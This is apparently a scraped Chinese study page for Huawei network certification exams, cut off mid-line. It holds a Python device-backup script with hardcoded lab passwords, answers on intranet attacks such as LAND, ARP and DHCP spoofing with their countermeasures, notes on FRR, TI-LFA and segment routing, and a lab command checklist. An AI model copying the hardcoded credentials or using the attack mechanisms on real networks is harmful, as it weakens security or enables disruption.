class="hljs-string">&quot;&quot;</span>.format(syslog)    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Using netconf configure syslog&#x27;</span>)    Netconf_by_rpc(ip, username, password, rpc_netconf)def datacom_loop(ip, username, password, name):    try:        <span class="hljs-keyword">while</span> True:            datacom = Datacom(ip, username, password)            with open(<span class="hljs-string">&#x27;command.txt&#x27;</span>)as f:                <span class="hljs-keyword">for</span> <span class="hljs-built_in">command</span> <span class="hljs-keyword">in</span> f:                    <span class="hljs-built_in">print</span>(datacom.command(<span class="hljs-built_in">command</span>))            <span class="hljs-keyword">if</span> datacom.fan_info():                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;All fans are faulty&#x27;</span>)            try:                than_one_day = datetime.now() - last_downloadtime &gt;= timedelta(days=1)            except NameError:                than_one_day = True            <span class="hljs-keyword">if</span> than_one_day:                downloadtime = datetime.now()                downloadtime_date = downloadtime.strftime(<span class="hljs-string">&#x27;%Y_%m_%d&#x27;</span>)                config_filename = <span class="hljs-string">&#x27;&#123;&#125;_&#123;&#125;.zip&#x27;</span>.format(downloadtime_date, name)                backup_filenmae = <span class="hljs-string">&#x27;&#123;&#125;_&#123;&#125;.bak&#x27;</span>.format(downloadtime_date, name)                datacom.command(<span class="hljs-string">&#x27;save fore &#123;&#125;&#x27;</span>.format(config_filename))                datacom.download(backup_filenmae, config_filename)                last_downloadtime = downloadtime                datacom.close()                <span class="hljs-built_in">sleep</span>(5*60)    except Exception as e:        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;stopped by &#123;&#125;&#x27;</span>.format(e))ip = <span class="hljs-string">&#x27;10.1.0.6&#x27;</span>name = <span class="hljs-string">&#x27;X_T1_AGG1&#x27;</span>syslog = <span class="hljs-string">&#x27;10.1.60.2&#x27;</span>username = <span class="hljs-string">&#x27;python&#x27;</span>password = <span class="hljs-string">&#x27;Huawei@123&#x27;</span>nc_username = <span class="hljs-string">&#x27;netconf&#x27;</span>nc_password = <span class="hljs-string">&#x27;Huawei@123&#x27;</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    try:        Netconf_syslog_host(ip, nc_username, nc_password, syslog)        datacom_loop(ip, username, password, name)    except KeyboardInterrupt:        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;end of process&#x27;</span>)language-python网络八股文1、内网攻击场景问题1 5’: 来自于外网的流量DDos攻击等，可以通过FW进行防御。来自于内部的流量，会有哪些?举出5 种内网攻击场景，并提供解决方案。(1 个场景1 分，5 个场景以上满分)答:DDoS 攻击是指攻击者通过控制大量的僵尸主机，向被攻击目标发送大量精心构造的攻击报文， 造成被攻击者所在网络的链路拥塞、系统资源耗尽，从而使被攻击者产生拒绝向正常用户的请求提供服务的效果。来自外网流量的DDoS 攻击等，可以使用防火墙进行防御，而来自内部的流量也往往存在很多攻击行为，以下是关于内网流量攻击以及相应解决方案:<span class="hljs-comment"># 1、LAND 攻击</span>LAND 攻击是攻击者利用TCP 连接三次握手机制中的缺陷，向目标主机发送一个源地址和目的地址均为目标主机、源端口和目的端口相同的SYN 报文，目标主机接收到该报文后，将创建一个源地址和目的地址均为自己的TCP 空连接，直至连接超时。在这种攻击方式下，目标主机将会创建大量无用的TCP空连接，耗费大量资源，直至设备瘫痪。攻击者利用这个攻击原理攻击重要节点的网络设备， 例如服务器的网关设备，这样会导致设备资源使用率过高，影响网络服务。<span class="hljs-comment"># 解决方式:</span>可以在网关设备上启用畸形报文攻击防范，启用该防范后，设备采用检测TCP SYN 报文的源地址和目的地址的方法来避免LAND 攻击。如果TCP SYN 报文中的源地址和目的地址一致，则认为是畸形报文攻击，丢弃该报文。<span class="hljs-comment"># 2、TC-BPDU 攻击</span>交换设备在接收到TC BPDU 报文后，会执行MAC 地址表项和ARP 表项的删除操作。攻击者利用该原理伪造TC BPDU 报文恶意攻击交换设备，短时间内产生大量的TC BPDU 报文，导致交换设备会收到很多TC BPDU 报文，频繁的删除操作会给设备造成很大的负担，导致设备资源使用率过高，影响网络质量，也给网络的稳定带来很大隐患。解决方式:在交换设备上启用防TC-BPDU 报文攻击，启用该功能后，在单位时间内，交换设备处理TC BPDU 报文的次数可配置。如果在单位时间内，交换设备在收到TC BPDU 报文数量大于配置的阈值，那么设备只会处理阈值指定的次数。对于其他超出阈值的TC BPDU 报文，定时器到期后设备只对其统一处理一次。这样可以避免频繁的删除MAC 地址表项和ARP 表项，从而达到保护设备的目的。<span class="hljs-comment"># 3、DHCP Server 仿冒攻击</span>由于DHCP Server 和DHCP Client 之间没有认证机制，所以如果在网络上随意添加一台DHCP 服务器，它就可以为客户端分配IP 地址以及其他网络参数。如果该DHCP 服务器为用户分配错误的IP 地址和其他网络参数，导致用户上网异常等现象。解决方案:为了防止DHCP Server 仿冒者攻击，可配置设备接口的“信任(Trusted)/非信任(Untrusted)”工作模式，启用后接口默认为非信任模式，将与合法DHCP 服务器直接或间接连接的接口设置为信任接口。此后，从“非信任(Untrusted)”接口上收到的DHCP 回应报文将被直接丢弃，这样可以有效防止DHCP Server 仿冒者的攻击。<span class="hljs-comment"># 4、IP 欺骗攻击</span>随着网络规模越来越大，通过伪造源IP 地址实施的网络攻击(简称IP 地址欺骗攻击)也逐渐增多。攻击者通过伪造合法用户的IP 地址获取网络访问权限，非法访问网络，甚至造成合法用户无法访问网络，或者信息泄露。解决方案:可以在接入设备上启用IPSG，IPSG 利用绑定表(源IP 地址、源MAC 地址、所属VLAN、入接口的绑定关系)去匹配检查二层接口上收到的IP报文，只有匹配绑定表的报文才允许通过，其他报文将被丢弃。绑定表包括静态和动态两种。静态绑定表使用user-bind 命令手工配置。DHCP Snooping 动态绑定表在配置DHCP Snooping 功能后，DHCP 主机动态获取IP 地址时，设备根据DHCP 服务器发送的DHCP 回复报文动态生成。配置IPSG 技术结合DHCP Snooping 功能进行抵御。可以在交换机上接口或者VLAN 上配置IPSG功能，对入方向的IP 报文进行绑定表匹配检查，当设备在转发IP 报文时， 将此IP 报文中的源IP、源MAC、端口、VLAN 信息和绑定表的信息进行比较，如果信息匹配，说明是合法用户，则允许此用户正常转发，否则认为是攻击者，丢弃该用户发送的IP 报文。从而避免了IP 欺骗攻击。<span class="hljs-comment"># 5、ARP 欺骗攻击</span>ARP 欺骗是针对ARP 的一种攻击技术，通过使用错误的ARP 载荷信息欺骗局域网内访问者PC 的网关MAC 地址，使访问者PC 错以为攻击者更改后的MAC 地址是网关的MAC，2、CloudCampus 全网业务随行原理问题2 3’：解释CloudCampus 解决方案的业务随行原理，如果有两个认证点(同时也是策略执行点)，用户分散在两个认证点，采用什么方案实现全网业务随行。给出两个方案。(3 分)答：<span class="hljs-comment"># 业务随行的原理如下：</span>传统园区网络主要通过ACL 对用户的策略进行控制。基于ACL 的策略配置依赖组网、IP 和VLAN 的规划，网络的拓扑改变、VLAN 规划改变、IP 地址规划改变以及用户的位置变化都会导致ACL 规则的变更，因此用户策略的配置无法与物理网络解耦，缺乏灵活性，可维护性差。为了解决这个问题，使得用户不管身处何地、使用哪个IP 地址，都可以保证该用户在园区网络中获得一致性的访问策略，华为推出了基于用户身份进行策略控制的业务随行方案。首先管理员在控制器中创建用户账号、定义UCL 组，同时将用户账号加入其所属的UCL 组，所有用户必须在认证通过后才可接入网络。然后为用户统一定义基于UCL 组的网络访问策略（即组策略）。策略组配置完成后控制器将管理员配置的UCL 组下发给所有关联的交换机（执行点和认证点设备），从而实现交换机对用户所属UCL 组的识别。同时执行点设备向控制器发起建立IP-GROUP 通道。当用户启动认证，在认证过程中，控制器根据用户的登录信息，将其与UCL组关联。认证成功后，控制器收集所有上线用户的IP 地址。控制器通过IP-GROUP 通道向执行点设备推送UCL 组表项信息（该用户所属安全组作为授权结果），记录源/目的IP 与UCL 组的映射关系。通过安全组完成了对网络对象的分类，通过安全组策略来定义该安全组能享受的网络服务。在iMaster NCE-Campus 中，管理员在二维矩阵上统一规划安全组所能享受的网络服务，包括访问权限、应用控制等。业务随行方案：<span class="hljs-comment"># （1） 场景1：虚拟化园区场景</span>可以把汇聚设备部署为认证点和策略执行点，在虚拟化园区网场景下，同时把汇聚设备部署为Edge 节点,Edge 节点之间会部署VXLAN 隧道。当终端设备通过认证后，汇聚设备会拥有UCL 组信息，同时会拥有该汇聚节点下终端的IP-Group信息。如果互访的终端都在同一个汇聚设备下，那么可以直接根据数据报文的源目的IP信息和IP-Group 表现来查找对应的源目安全组信息，之后再根据源目安全组执行组间策略，允许访问则转发，不允许则丢弃处理。如果互访的目的终端不在该汇聚节点下，汇聚设备只有源终端的IP-Group 表项信息，没有目的终端的IP-Group 表项信息，所以不能直接执行组间策略。而此时汇聚节点同时是Edge 节点，会进行Vxlan 报文的封装，同时会将源安全组ID信息封装在VXLAN 报文中传递到对端的Edge 设备，对端设备再根据目的IP 查找目的的安全组。最后根据找到的目的安全组和VXLAN 报文中的源组ID 执行组间策略，如果禁止就丢弃，如果允许就通过。<span class="hljs-comment"># （2） 场景2：非虚拟化园区网场景</span>可以把汇聚设备部署为认证点和策略执行点。当终端设备通过认证后，汇聚设备会拥有UCL 组信息，同时会拥有该汇聚节点下终端的IP-Group 信息。如果互访的终端都在通一个汇聚设备下，那么可以直接根据数据报文的源目IP信息和IP-Group 表项来查找对应的源目安全组信息，之后再根据源目安全组执行组间策略，允许访问则转发，不允许则进行丢弃处理。如果互访的终端不在同一个汇聚设备下，汇聚设备只有源终端的IP-Group 表项信息，没有目的终端的IP-Group 表项信息，所以不能够直接执行组间策略。而普通的IP 报文无法携带安全组ID 信息，所以此时需要在控制器上配置IP-Group订阅，控制器需要把目的终端的IP-Group 表项信息推送到该汇聚设备上，拥有源目终端的IP-Group 信息，则可以根据数据报文的源目的IP 和IP-Group 表项来查找对应的源目阿全组信息，然后再执行策略，如果禁止就丢弃，允许就通过即可。3、FRR 环路技术问题3 5’：FRR 技术可以分为LFA、R-LFA、TI-LFA，FRR 的环路风险有哪些?(为什么会有环路)答：1、LFA （Loop-Free Alternates）算法以可提供备份链路的邻居为根节点，利用SPF （Shortest Path First〉算法计算出到目的节点的最短距离。然后，按照以下不等式计算出一组开销最小且无环的备份链路。LFA 不等式1：Distance_opt(N, D)＜ Distance_opt(N, S) + Distance_opt(S, D)。其中，Distance_opt(X,Y)是指节点X 到Y 之间的最短路径，N 是备份链路的节点，D 是流量转发的目的节点，S 是转发流量的源节点。LFA 不等式2：Distance_opt(N, D)＜ Distance_opt(N, E) + Distance_opt(E，D)。其中，S 是转发流量的源节点，E 是发生故障的节点，N 是备份链路的节点，D是流量转发的目的节点。满足以上两个公式，就避免了计算的备用路径产生环路的风险。但是并不意味部署1P FRR 的网络环境中就一定没有环路，可能会因为收敛不一致导致微环。当主路径故障，流量切换到备份路径后，而后期原主路径恢复后，转发流量的源节点还未收敛完成，收到流量依旧向备份路径转发。此时备份链路的节点已经收敛完成，且该节点去往目的节点会经过源节点，则产生微环。2、LFA FRR 对于某些大型组网，特别是环形组网，无法计算出备份路径，不能满足可靠性要求。在这种情况下，实现了Remote LFA FRR。Remote LFA 算法根据保护路径计算PQ 节点，并在源节点与PQ 节点之间建立tunnel 隧道形成备份下一跳保护。当保护链路发生故障时，流量自动切换到隧道备份路径，继续转发，从而提高网络可靠性。R-LFA 虽然提高了计算备用路径的覆盖率，但是同样会存在路由器拓扑变化的IGP 收敛先后不一致导致的微环。3、LFA FRR 和Remote LFA 对于葉些场景中，扩展P 空间和Q 空间既没有交集，也没有直连的邻居，无法计算出备份路径，不能满足可靠性要求。在这种情况下，实现了T-LFA。TI-LFA 算法根据保护路径计算扩展P 空间，Q 空间，Post convergence 最短路径树，以及根据不同场景计算Repair List，并从源节点到。节点，再到Q 节点建立SegmentRouting 隧道形成备份下一跳保护。当保护链路发生故障时，流量自动切换到隧道备份路径，继续转发，从而提高网络可靠性。虽然T-LFA 拓扑无关，但是同样存在路由器收敛不一致导致的微环问题，T-LFA 可以通过算法来避免微环，主要的微环保护以下三个方面：<span class="hljs-comment"># （1） SR-MPLS 本地正切防微环</span>本地正切微环指的是紧邻故障节点的节点收敛后引发的环路。全网节点都部署TI-LFA，当主路径故障的时候，节点针对目的地址的收敛过程如下：源节点感知到故障，进入TI-LFA 的快速重路由切换流程，向报文插入Repair List，将报文转向TI-LFA 计算的PQ 节点。因此报文会先转发到下一跳备份节点。当源节点完成到目的地址的路由收敛，则直接查找目的节点的路由，将报文转发到下一跳备份节点，此时不再携带Repair List，而是直按转发。如果此时备份节点还未完成收敛，当源节点向备份节点转发报文时，备份节点的转发表中到目的节点的路由下一跳还是源节点，这样就在源节点和备份节点之间形成了环路。解决方式：在源节点部署正切防微环，部署正切防微环后的收敛流程如下：源节点感知到故障，进入T-LFA 流程，报文沿着备份路径转发，下一跳为备份节点，并封装Repair List，源节点启动一个定时器T1。在T_期间，源节点不响应拓扑变化，转发表不变，报文依旧按照TI-LFA 策略转发。网络中其他节点正常收敛。源节点的定时器T1 超时，这时网络中其他节点都己经完成收敛，源节点也正常收敛，退出TI-LFA 流程，按照正常收敛后的路径转发报文。<span class="hljs-comment"># （2）本地回切防微环</span>微环不但可能在路径正切时产生，也可能在故障恢复后路径回切时出现。下面介绍回切时产生环路：主链路发生故障之后，报文按照重新收敛之后的备份路径发送到目的节点。主链路故障恢复后，假设备份节点率先完成收敛。源节点收到报文，由于源节点未完成收敛，依然按照故障恢复前路径转发，转发给备份节点。备份节点已经完成收敛，所以备份节点按照故障恢复后的路径转发到源节点，这样就在源节点和备份节点之间形成了环路。解决方式：在备份节点部署回切防微环，部署回切防微环后的收敛流程如下：主链路故障后恢复，备份节点率先完成收敛。备份节点启动定时器T1，在T1 超时前，备份节点针对访问目的节点的报文计算出防微环Segment List。源节点收到报文，由于源节点未完成收敛，依然按照故障恢复前路径转发，转发给备份节点。备份节点在报文中插入防微环Segment List，并转发到源节点。源节点根据Node SID 和Adjacency SID 指令执行转发动作，沿着Adjacency SiID 指定的出接口转发出去，最终转发至目的节点。<span class="hljs-comment"># （3） 远端防微环</span>前面介绍了本地正切防微环，实际上正切时不仅会导致本地微环，也可能引起远端节点之间形成环路，即沿着报文转发路径，如果离故障点更近的节点先于离故障点远的节点收敛，就可能会导致环路。下面描述远端微环产生过程：计算节点的非直连链路或节点故障，假设计算节点率先完成收敛，备份节点未完成收敛。备份节点沿着故障前路径将报文转发到计算节点，由于计算节点已经完成收敛，根据路由下一跳转发到备份节点。这样报文就在备份节点和计算节点之间形成了环路。解决方式：在计算节点使能远端防微环，使能远端防微环后的收敛流程如下：计算节点的非直连链路或节点故障，假设计算节点率先完成收敛。计算节点启动定时器T1，在T1 超时前，算节点针对访问目的节点的报文计算出防微环Segment List。备份节点收到报文，由于备份节点未完成收敛，依然按照故障发生之前的路径将报文转发给计算节点。计算节点在报文中插入防微环Segment List，并转发到备份节点。备份节点根据Node SID 的指令执行转发动作，将报文转发给最远P 节点。最远P 节点根据AdjacencysD 的指令执行转发动作，沿着Adjacency SID 出接口转发出去，最后转发到目的节点。4、FRR TI-LFA环路风险问题3 在部署FRR 时，开启TI-LFA 功能规避环路的风险,那么FRR 是否存在环路的风险？答：LFA FRR 和Remote LFA 对于某些场景中，扩展P 空间和Q 空间既没有交集，也没有直连的邻居，无法计算出备份路径，不能满足可靠性要求。在这种情况下，实现了TI-LFA。TI-LFA 算法根据保护路径计算扩展P 空间，Q 空间，Post-convergence 最短路径树，以及根据不同场景计算Repair List，并从源节点到P 节点，再到Q 节点建立SegmentRouting 隧道形成备份下一跳保护。当保护链路发生故障时，流量自动切换到隧道备份路径，继续转发，从而提高网络可靠性。虽然TI-LFA 拓扑无关，但是同样存在路由器收敛不一致导致的微环问题，TI-LFA 可以通过算法来避免微环，主要的微环保护以下三个方面：<span class="hljs-comment"># （1） SR-MPLS 本地正切防微环</span>本地正切微环指的是紧邻故障节点的节点收敛后引发的环路。全网节点都部署TIHLFA，当主路径故障的时候，源节点针对目的地址的收敛过程如下：源节点感知到故障，进入T-LFA 的快速重路由切换流程，向报文插入Repair List，将报文转向TH-LFA 计算的PQ 节点。因此报文会先转发到下一跳备份节点。当源节点完成到目的地址的路由收敛，则直接查找目的节点的路由，报文转发到下一跳备份节点，此时不再携带Repair List，而是直接转发。如果此时备份节点还未完成收敛，当源节点向备份节点转发报文时，备份节点的转发表中到目的节点的路由下一跳还是源节点，这样就在源节点和备份节点之间形成了环路。解决方式：在源节点部署正切防微环，部署正切防微环后的收敛流程如下：源节点感知到故障，进入T-LFA 流程，报文沿着备份路径转发，下一跳为备份节点，并封装RepairList。源节点启动一个定时器T1。在T1 期间，源节点不响应拓扑变化，转发表不变，报文依旧按照TI-LFA 策略转发。网络中其他节点正常收敛。源节点的定时器T1 超时，这时网络中其他节点都己经完成收敛，源节点也正常收敛，退出TI-LFA 流程，按照正常收敛后的路径转发报文。<span class="hljs-comment"># （2）本地回切防微环</span>微环不但可能在路径正切时产生，也可能在放障恢复后路径回切时出现。下面介绍回切时产生环路：主链路发生故障之后，报文按照重新收敛之后的备份路径发送到目的节点。主链路故障恢复后，假设备份节点率先完成收敛。源节点收到报文，由于源节点未完成收敛，依然按照故障恢复前路径转发，转发给备份节点。备份节点已经完成收敛，所以备份节点按照故障恢复后的路径转发到源节点，这样就在源节点和备份节点之间形成了环路。解决方式：在备份节点部署回切防微环，部署回切防微环后的收敛流程如下：主链路故障后恢复，备份节点率先完成收敛。备份节点启动定时器T1，在T1超时前，备份节点针对访问目的节点的报文计算出防微环Segment List。源节点收到报文，由于源节点未完成收敛，依然按照故障恢复前路径转发，转发给备份节点。备份节点在报文中插入防微环Segment List，并转发到源节点。源节点根据Node SID 和Adjacency SID 指令执行转发动作，沿着Adjacency SID 指定的出接口转发出去，最终转发至目的节点。<span class="hljs-comment"># （3）远端防微环</span>前面介绍了本地正切防微环，实际上正切时不仅会导致本地微环，也可能引起远端节点之间形成环路，即沿着报文转发路径，如果离放障点更近的节点先于离放障点远的节点收敛，就可能会导致环路。下面描述远端微环产生过程：计算节点的非直连链路或节点故障，假设计算节点率先完成收敛，备份节点未完成收敛。备份节点沿着故障前路径将报文转发到计算节点，由于计算节点己经完成收敛，根据路由下一跳转发到备份节点。这样报文就在备份节点和计算节点之间闻形成了环路。解决方式：在计算节点使能远端防微环，使能远端防微环后的收敛流程如下：计算节点的非直连链路或节点故障，假设计算节点率先完成收敛。计算节点启动定时器T1，在T1 超时前，计算节点针对访问目的节点的报文计算出防微环Segment List。备份节点收到报文，由于备份节点末完成收敛，依然按照故障发生之前的路径将报文转发给计算节点。计算节点在报文中插入防微环Segment List，并转发到备份节点。备份节点根据Node SID 的指令执行转发动作，将报文转发给最远P 节点。最远P 节点根据Adjacency SID 的指令执行转发动作，沿着Adjacency SID 出接口转发出去，最后转发到目的节点。5、LDP、RSVP-TE 跟SR 比较问题4：LDP、RSVP-TE 跟SR 比，不好在哪里。(MPLS LDP 和RSVP-TE 与SR 相比较有不足之处，那么部署MPLS LDP 和RSVP-TE 有什么问题?)答:MPLS LDP 和SR 相比MPLS LDP 建立LSP 需要同时使用IGP 和LDP 协议，IGP 用来通告路由和拓扑信息，形成路由表。LDP 用来分发标签，形成标签转发表。LDP 的LSP 需要依赖IGP 生成的路由表才能形成LSP。MPLS LDP 的两个主要缺点:    (1)存在IGP 和LDP 同步的问题，某些场景，IGP 如果先收敛，LDP 后收敛会导致数据传递的路由黑洞问题。    (2)LDP 不支持计算路径。SR 的路由信息的通告和计算全部使用IGP 协议单独完成，OSPF 通过LSA10 中的type7 来携带PrefixSID，ISIS 通过TLV235携带PrefixSID，那么就不存在MPLS LDP 中的IGP 和LDP 问题。    (3)LDP 是为每条路由分配标签，而SR 只为节点和IGP 的邻居分配标签，在标签空间的使用上，SR 比LDP 少很多，SR 更适合大规模组网。RSVP-TE 和SR 相比    (1)控制平面:SR 信令控制也是IGP 的扩展，无需专门的MPLS 的控制协议，减少了协议的数量，而RSVP- TE 需要RSVP 作为控制协议，控制平面比较复杂。    (2)可扩展性:SR 是源路由技术，通过控制器可以计算路径，隧道的信息有标签栈进行携带，也就是状态在数据包中。而RSVPTE 每台设备都需要维护隧道的状态信息，可扩展性差。    (3)负载分担能力:RSVP 的隧道不支持负载分担，如果需要做负载必须创建多个隧道，而SR 的隧道很容易支持负载分担。6、外网攻击场景论述题1.5 来自外网的流量攻击 DDos攻击等，可以通过FW进行防御。来自于内网的流量，会有哪些？举出5种内网攻击场景，并提供解决方案。（1个场景1分，5个场景以上满分）答：DDos攻击是指攻击者通过控制大量的僵尸主机，向被攻击目标发送大量精心构造的攻击报文，造成被攻击者所在网络的链路拥塞、系统资源耗尽，从而使被攻击者产生拒绝向正常用户的请求提供服务的效果。来自外网流量的DDos攻击等，可以使用防火墙进行防御，而来自内部的流量也往往存在很多攻击行为，以下是关于内网流量攻击以及相应的解决方案：LAND 攻击LAND攻击是攻击者利用 TCP 连接三次握手机制中的缺陷，向目标主机发送一个源地址和目的地址均为目标主机、源端口和目的端口相同的 SYN 报文，目标主机接受到该报文后，将创建一个源地址和目的地址均为自己的 TCP 空连接，直至连接超时。在这种攻击方式下，目标主机将会创建大量无用的 TCP 空连接，耗费大量资源，直至设备瘫痪。攻击者利用这个攻击原理攻击重要节点的网络设备，例如服务器的网关设备，这样会导致设备资源使用率过高，影响网络服务。解决方式：可以在网关设备上启用畸形报文攻击防范，启用该防范后，设备采用监测 TCP SYN 报文的源地址和目的地址的方式来避免LAND攻击。如果 TCP SYN 报文中的源地址和目的地址一致，则认为是畸形攻击，丢弃该报文。TC-BPDU攻击交换设备在接受到TC BPDU 报文后，会执行 MAC 地址表项和 ARP 表项的删除操作。攻击者利用该原理伪造TC BPDU 报文而已攻击交换设备，短时间内产生大量的 TC BPDU 报文，导致交换设备会收到很多 TC BPDU 报文，频繁的删除操作会给设备造成很大的负担，导致设备资源使用率过高，影响网络质量，也给网络的稳定带来很大隐患。解决方式：在交换设备上启用防 TC-BPDU 报文攻击，启用该功能后，在单位时间内，交换设备处理 TC BPDU 报文的次数可配置。如果在单位时间内，交换设备在收到 TC BPDU 报文数量大于配置的阈值，那么设备只会处理阈值指定的次数。对于其他超出阈值的 TC BPDU 报文，定时器到期后设备只对其统一处理一次。这样可以避免频繁的删 MAC 地址表象和 ARP 表项，从而达到保护设备的目的。DHCP Server 仿冒攻击由于 DHCP Server 和 DHCP Client 之间没有认知机制，所以如果在网络上随意添加一台 DHCP 服务器，他就可以为客户端分配 IP 地址以及其他网络参数。如果该 DHCP 服务器为用户分配错误的 IP 地址和其他的网络参数，导致用户上网异常等现象。解决方案：为了防止 DHCP Server 放冒者攻击，可配置设备接口的“信任(Trusted)/非信任(Untrusted)”工作模式，启用后接口默认为非信任模式，将与合法 DHCP 服务器直接或间接的连接的接口设置为信任接口。此后，从“非信任(Untrusted)”接口上收到的 DHCP 回应报文将被直接丢弃，这样可以有效防止 DHCP Server 放冒者的攻击。IP 欺骗攻击随着网络规模越来越大，通过伪造源 IP 地址实施的网络攻击（简称 IP 地址欺骗攻击）也逐渐增多。攻击者通过伪造合法用户的 IP 地址获取网络访问权限，非法访问网络，甚至造成合法用户无法访问网络，或者信息渗漏。解决方案：可以在接入设备上启用 IPSG，IPSG 利用绑定表（源 IP 地址、源 MAC 地址、所属 VLAN、入接口的绑定关系）去匹配检查二层接口上收到的IP报文，只有匹配绑定表的报文才允许通过，其他报文将被丢弃。绑定表包括静态和动态两种。静态绑定表使用 user-bind 命令手动配置。 DHCP Snooping 动态绑定表在配置 DHCP Snooping 功能后， DHCP 主机动态获取IP地址时，设备根据 DHCP 服务器发送的 DHCP 回复报文动态生成。配置 IPSG 技术结合 DHCP Snooping 功能进行抵御。可以在交换机上接口或者 VLAN 上配置 IPSG 功能，对入方向的IP报文进行绑定表匹配检查，当设备在转发IP报文时，将此IP报文中的源IP、源MAC、端口、VLAN信息和绑定表的信息进行比较， 如果信息匹配，说明是合法用户，则允许此用户正常转发，否则认为是攻击者，丢弃该用户发送的IP报文。从而避免了IP欺骗报文。ARP欺骗攻击ARP欺骗是针对ARP的一种攻击技术，通过使用错误的ARP 载荷信息欺骗局域网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网关不通。此种攻击可让攻击者获取局域网上的数据包甚至可以篡改数据包，且可让网络上特定计算机或所有计算机无法正常连通。解决方案：为了防御 ARP 欺骗攻击，可以在 Switch 上部署动态 ARP 监测 DAI(Dynamic ARP Inspection)功能。动态ARP监测是利用DHCP snooping绑定表来防御中间人攻击的。当设备收到ARP报文时，将此ARP报文对应的源IP、源MAC、VLAN以及接口信息和绑定表的信息进行比较，如果信息匹配，说明发送该ARP报文的用户是合法用户，允许此用户的ARP报文通过，否则就认为是攻击，丢弃该ARP报文。7、CloudCampus 解决方案的业务随行多认证点论述题2.5 解释 CloudCampus 解决方案的业务随行原理，如果有两个认证点（同时也是策略执行点），用户分散在两个认证点，采用什么方案实现全网业务随行。给出两个方案。答：业务随行的原理如下：传统园区网络主要通过 ACL 对用户的策略进行控制。基于 ACL 的策略配置依赖组网、IP和VLAN 的规划，网络的拓扑改变、VLAN规划改变、IP地址改变以及用户的位置变化都会导致ACL规则的变更，因此用户策略的配置无法与物理网络解耦，缺乏灵活性，可维护性差。为了解决这个问题，使得用户不管身处何处、使用哪个IP地址，都可以保证该用户在园区网络中忽的一致性的访问策略截图截图心法X园区Export: ospf，tracert(Service_OA)AC: APCore: ip, ospf, ip pool, routing-tableAGG: ip, routing-table, access-user, stackACC: interfaceFW: ip, routing-table, firewall session tableTerminal1/2/5: ping (出口，99,100,101)Y园区 Terminal 互相ping 并ping（Service_RD1, Service_RD2, Service_common, Store(OA/RD)）Terminal 03: R&amp;D / MarketingTerminal 04: ProductionTerminal 05: Employee / GuestY_Export: ospfStore_Export1: ping -vpn-instance(Store(OA/RD)), tracert -vpn-instance(vpn2/4, 5.254)Z园区ALL PE: interface, config(isis/bgp), isis peer, mpls ldp, bgp peerX_PE1: routing-table vpn-instance OA Service(OA/R&amp;D) verbose, tracert(1-&gt;5 lo0)Y_PE1: routing-table vpn-instance OA/R&amp;D Service(OA/R&amp;D) verbose, tracert(3-&gt;5 lo0)Z_PE1/2: routing-table vpn-instance OA/RD,Z_Export: ip, routing-table vpn-instance OA/RDX园区1. 2张python执行结果<span class="hljs-comment"># X_T1_Export2</span>2. display ospf peer brief<span class="hljs-comment"># X_T1_AC1</span>3. display ap all<span class="hljs-comment"># X_T1_AGG1</span>4. display ip int brief5. display ip routing-table6. display access-user7. display stack<span class="hljs-comment"># X_T2_AGG1</span>8. dis ip int brief9. display ip routing-table10. display access-user11. display stack<span class="hljs-comment"># X_T1_Core</span>12. display ip int brief13. display ospf peer brief14. display ip routing-table15. display ip pool vpn-instance Employee16. display ip pool vpn-instance Guest17. display ip routing-table vpn-instance Employee18. display ip routing-table vpn-instance Guest<span class="hljs-comment"># X_T1/2_ACC1/2</span>19. display current-configuration interface<span class="hljs-comment"># X_T1_FW1</span>20. display ip int brief21. display ip routing-table vpn-instance Employee22. display ip routing-table vpn-instance Guest<span class="hljs-comment"># 23 Terminal 01</span>ipconfig <span class="hljs-comment"># 14 IP</span>ping -w 1 10.255.1.254 <span class="hljs-comment"># 通</span>ping -w 1 10.1.60.99 <span class="hljs-comment"># 通</span>ping -w 1 10.1.60.100 <span class="hljs-comment"># 通</span>ping -w 1 10.1.60.101 <span class="hljs-comment"># 不通</span>ipconfig <span class="hljs-comment"># 21 IP</span>ping -w 1 10.255.1.254 <span class="hljs-comment"># 通</span>ping -w 1 10.1.60.99 <span class="hljs-comment"># 通</span>ping -w 1 10.1.60.100 <span class="hljs-comment"># 通</span>ping -w 1 10.1.60.101 <span class="hljs-comment"># 不通</span><span class="hljs-comment"># 24 Terminal 02</span>ipconfig <span class="hljs-comment"># 32 IP</span>ping -w 1 10.255.1.254 <span class="hljs-comment"># 不通</span>ping -w 1 10.1.60.99 <span class="hljs-comment"># 通</span>ping -w 1 10.1.60.100 <span class="hljs-comment"># 通</span>ping -w 1 10.1.60.101 <span class="hljs-comment"># 不通</span>ipconfig <span class="hljs-comment"># 41 IP</span>ping -w 1 10.255.1.254 <span class="hljs-comment"># 不通</span>ping -w 1 10.1.60.99 <span class="hljs-comment"># 通</span>ping -w 1 10.1.60.100 <span class="hljs-comment"># 通</span>ping -w 1 10.1.60.101 <span class="hljs-comment"># 不通</span><span class="hljs-comment"># 25 Terminal 05</span>ipconfig <span class="hljs-comment"># 55 IP</span>ping -w 1 10.255.1.254 <span class="hljs-comment"># 通</span>ping -w 1 10.1.60.99 <span class="hljs-comment"># 通</span>ping -w 1 10.1.60.100 <span class="hljs-comment"># 通</span>ping -w 1 10.1.60.101 <span class="hljs-comment"># 不通</span>ipconfig <span class="hljs-comment"># 105 IP</span>ping -w 1 10.255.1.254 <span class="hljs-comment"># 通</span>ping -w 1 10.1.60.100 <span class="hljs-comment"># 不通</span>ping -w 10.1.60.101 <span class="hljs-comment"># 不通</span>telnet 10.1.60.99 3389Y园区<span class="hljs-comment"># 1 Terminal 03 （R&amp;D, Procution, Guest）</span>ipconfig <span class="hljs-comment"># 10.2.12.x</span>ping -w 1 10.2.21.79 <span class="hljs-comment"># 通</span>ping -w 1 10.2.55.61 <span class="hljs-comment"># 通</span>ping -w 1 10.100.3.1 <span class="hljs-comment"># 通</span>ping -w 1 10.3.99.254 <span class="hljs-comment"># 不通</span>ping -w 1 10.3.100.254 <span class="hljs-comment"># 通</span>ping -w 1 10.3.101.254 <span class="hljs-comment"># 不通</span>ping -w 1 10.2.110.149 <span class="hljs-comment"># 不通</span>ipconfig <span class="hljs-comment"># 10.2.31.x</span>ping -w 1 10.2.110.149 <span class="hljs-comment"># 不通</span>ping -w 